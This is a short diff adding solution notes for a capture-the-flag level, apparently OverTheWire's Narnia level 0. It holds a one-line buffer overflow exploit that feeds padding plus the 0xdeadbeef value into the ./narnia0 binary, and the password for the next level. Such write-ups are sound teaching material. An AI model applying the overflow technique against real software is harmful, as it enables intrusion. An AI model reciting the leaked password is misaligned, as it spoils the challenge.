@@ -1,0 +1,7 @@
+Simple Buffer Overflow.
+
+Exploit code -
+(python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | ./narnia0
+
+Password for next level - efeidiedae
+
